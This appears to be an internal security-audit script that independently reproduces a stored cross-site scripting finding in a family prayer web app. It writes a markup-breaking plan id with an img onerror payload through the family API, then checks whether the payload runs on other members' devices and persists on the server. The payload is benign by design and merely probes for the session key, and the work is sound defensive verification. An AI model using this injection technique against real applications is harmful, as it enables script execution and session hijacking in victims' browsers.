// Skeptic 1 for critic-plan-id-xss-1: a family `plans` row whose plan id carries markup reaches
// renderPlans() (apps/prayer.html:1183-1184) raw inside <option value="...">. Independent reproduction.
// Run: node "audits/tools/phase3/prayer/verify-critic-plan-id-xss-1-1.mjs" [webkit|chromium]
//  -> audits/evidence/p3/prayer/verify-critic-plan-id-xss-1-1[-chromium].json (+ kiara PNG for webkit)
// The payload only counts runs and records the TYPE of hub.session; it never reads or sends a token value.
import fs from 'node:fs';
import { local, sleep } from '../../lib/local.mjs';
const engine = process.argv[2] || 'webkit';
const OUT = 'audits/evidence/p3/prayer';
const tag = `verify-critic-plan-id-xss-1-1${engine === 'chromium' ? '-chromium' : ''}`;
const res = { engine };
const log = (k, v) => { res[k] = v; console.log(k, '->', JSON.stringify(v).slice(0, 600)); };
const PAY = 'vq"><img src="x:" onerror="window.__vq=(window.__vq||0)+1;window.__vqs=typeof localStorage.getItem(\'hub.session\')"><i x="';
const plan = { id: PAY, name: 'Everything', mode: 'everything', focusCategory: '', includeDaily: true, rotationSize: 3, groupByCategory: false,
  dayMap: { Sun: [], Mon: [], Tue: [], Wed: [], Thu: [], Fri: [], Sat: [] }, show: { meter: true, streak: true, answered: true, anniversaries: true, review: true } };
const st = f => f.evaluate(() => ({ runs: window.__vq || 0, sess: window.__vqs || null, imgInSelect: document.querySelectorAll('#f-plan img').length, activeList: D.activeList }));
const L = await local({ variant: 'typical', clock: 'real', engine });
try {
  const open = async (profile, device) => { const d = await L.device({ device, profile, fixedTime: false }); await d.goto('#home'); const f = await d.openApp('prayer', { wait: '#todayLine' }); await sleep(1500); return { d, f }; };
  const kid = await open('kiara', 'ipad-portrait');
  const eli = await open('eli', 'iphone-pwa');
  await sleep(4000);
  log('before', { kiara: await st(kid.f), eli: await st(eli.f) });
  const now = Date.now();
  const w = await L.apiAs('ezra', '/api/data/prayer/batch?scope=family', { method: 'POST', body: { items: [{ key: 'plans', value: [plan], updated_at: now }, { key: 'activePlan', value: PAY, updated_at: now }] } });
  log('writeAsEzra', { status: w.status });
  let t0 = Date.now(), got = false;
  while (Date.now() - t0 < 50000 && !got) { await sleep(1000); got = await kid.f.evaluate(p => D.lists.shared.activePlan === p, PAY); }
  await sleep(1200);
  log('kiaraAfterPoll', { pulled: got, afterMs: Date.now() - t0, ...(await st(kid.f)) });
  if (engine === 'webkit') await kid.d.shot(`${OUT}/${tag}-kiara.png`);
  t0 = Date.now(); got = false;
  while (Date.now() - t0 < 50000 && !got) { await sleep(1000); got = await eli.f.evaluate(p => D.lists.shared.activePlan === p, PAY); }
  await sleep(800);
  log('eliPersonalAfterPoll', { pulled: got, ...(await st(eli.f)) });
  await eli.f.click('#listSwitch [data-list="shared"]'); await sleep(900);
  log('eliAfterTapFamily', await st(eli.f));
  // persistence: Eli ticks one family request (a normal family save), then what does the server hold for `plans`?
  const tickId = await eli.f.evaluate(() => { const b = document.querySelector('#todayList [data-pray]'); return b && b.dataset.pray; });
  if (tickId) { await eli.f.click(`#todayList [data-pray="${tickId}"]`); await sleep(3500); }
  const srv = await L.apiAs('mom', '/api/data/prayer?scope=family');
  const row = k => (srv.body.items || []).find(i => i.key === k);
  log('serverAfterEliFamilySave', { ticked: tickId, plansIdIsPayload: !!(row('plans') && row('plans').value && row('plans').value[0] && row('plans').value[0].id === PAY), activePlanIsPayload: row('activePlan') && row('activePlan').value === PAY });
  // a second, fresh browser (empty hub cache) opens Prayer as Kiara: does it run on open, and does the row survive?
  await kid.d.close();
  const k2 = await open('kiara', 'ipad-portrait');
  log('kiaraFreshBrowserOnOpen', await st(k2.f));
  await sleep(4000);
  const srv2 = await L.apiAs('mom', '/api/data/prayer?scope=family');
  const r2 = (srv2.body.items || []).find(i => i.key === 'plans');
  log('serverAfterFreshOpen', { plansIdIsPayload: !!(r2 && r2.value && r2.value[0] && r2.value[0].id === PAY) });
  await k2.d.close();
  await eli.d.close();
  const pg = await L.browser.newPage(); await pg.setContent('<select id=s></select>');
  log('selectParser', await pg.evaluate(async () => { const s = document.getElementById('s'); s.innerHTML = '<option value="a"><img src="x:" onerror="window.__t=1"><i x="">A</option>'; await new Promise(r => setTimeout(r, 400)); return { ua: navigator.userAgent.slice(0, 120), imgKept: !!s.querySelector('img'), fired: !!window.__t }; }));
  await pg.close();
} catch (e) { log('error', String(e.stack || e)); }
finally { fs.writeFileSync(`${OUT}/${tag}.json`, JSON.stringify(res, null, 2)); await L.close(); }
